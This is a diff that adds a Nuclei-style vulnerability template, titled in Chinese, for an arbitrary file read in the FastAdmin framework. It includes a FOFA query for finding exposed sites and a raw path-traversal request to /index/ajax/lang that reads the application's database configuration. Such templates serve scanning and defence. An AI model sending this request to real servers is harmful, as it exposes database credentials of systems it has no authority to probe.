@@ -1,0 +1,27 @@
+id: Fastadmin-lang-fileread
+info:
+  name: Fastadmin框架lang任意文件读取
+  author: god
+  severity: high
+  description: Fastadmin框架lang任意文件读取
+  metadata:
+    fofa-query: body="/assets/js/require.js"
+  tags: fastadmin,fileread
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /index/ajax/lang?lang=../../application/database HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - jsonpReturn
+      condition: and
+
